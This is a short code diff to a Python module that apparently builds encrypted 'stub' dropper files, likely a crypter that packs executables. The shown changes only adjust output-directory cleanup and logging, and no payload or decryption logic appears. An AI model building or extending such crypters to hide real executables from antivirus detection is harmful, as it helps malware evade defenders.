@@ -214,8 +214,9 @@ class StartModule():
 			return arg
 
 	def clean_output_dir(self):
-		output_dir = os.path.abspath(os.path.join(os.path.dirname(stub_name), 'output'))
-		shutil.rmtree(output_dir)
+		output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
+		if os.path.isdir(output_dir):
+			shutil.rmtree(output_dir)
 
 	def saveStub(self, stub, save_name, print_save_stub=True):
 		# Save the Stub
@@ -224,7 +225,7 @@ class StartModule():
 		stub_file.write(stub)
 		stub_file.close()
 		if print_save_stub:
-			print('Stub saved as {file}'.format(file=stub_name))
+			Logger.printMessage(message='{methodName}'.format(methodName='saveStub'), description='{filename}'.format(filename=save_name), debug_module=True)
 
 	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, is_iterating=False, is_last=False, convert=False):
 		# Create Stub in Python File
@@ -291,7 +292,6 @@ dcy_data = dcy(pk=pk, cptx=cdx)
 		compile_exe es si queremos compilarlo con pyinstaller
 		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
-		self.clean_output_dir()
 		temp_filename = filename
 		if iterate_count > 1:
 			temp_filename = filename
